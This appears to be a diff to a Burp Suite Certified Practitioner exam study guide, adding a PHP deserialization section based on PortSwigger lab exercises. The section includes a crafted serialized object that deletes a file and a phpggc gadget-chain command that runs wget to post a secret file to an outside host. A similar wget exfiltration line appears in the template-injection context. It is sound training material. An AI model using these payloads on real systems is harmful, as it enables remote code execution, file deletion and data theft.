@@ -14,6 +14,7 @@
 **[Privilege Escalation](#privilege-escalation)**  
 [JSON roleid PrivEsc](#privesc-json-roleid)  
 [CSRF Change email or Password](#csrf-change-password-or-email)  
+[Deserialization](#deserialization)  
 [SQLi Admin Credential Exfil](#sql-injection)  
 [JSON Web Tokens](#jwt)  
   
@@ -759,9 +760,7 @@ grep 'Update email'
 
 [PortSwigger Lab: Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)  
   
-
 # Privilege Escalation  
-  
   
 ## PrivEsc JSON RoleId  
 
@@ -831,6 +830,39 @@ csrf=TOKEN&username=administrator
 
 [PortSwigger Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)  
   
+## Deserialization  
+
+>Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scannner identify serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
+
+![info-disclose](images/info-disclose.png)  
+
+>Reviewing PHP source code by adding ***~*** character at end of GET request ```https://target.net/libs/CustomTemplate.php~```, we notice **desctruct** method.  
+
+![comments-in-source-code](images/comments-in-source-code.png)  
+
+>Original Decoded cookie 
+
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bi0egmdu49lnl9h2gxoj3at4sh3ifh9x";}
+```  
+
+>Make new PHP serial CustomTemplate object with the **lock_file_path** attribute set to **/home/carlos/morale.txt**. Make sure to use the correct data type labels and length indicators. The 's' indicate string and the lenth
+
+```
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```  
+
+![modify-serial-cookie](images/modify-serial-cookie.png)  
+  
+[PortSwigger Lab: Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)  
+
+>**Note:** In BSCP exam not going to run this as it delete file, in exam read source code to ***identify*** the ```unserialize()``` PHP funcition and extract content out-of-band using PHPGGC.  
+
+```
+./phpggc Symfony/RCE4 exec 'wget http://Collaborator.com --post-file=/home/carlos/secret' | base64
+```  
+
+[PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
 
 ## SQL Injection  
 
@@ -1458,9 +1490,7 @@ portswigger.net/research/template-injection
 
 wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 ```  
-
->SSTI Section ...need more input...  
-
+  
 ## ProtoType Pollution  
 
 >A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  
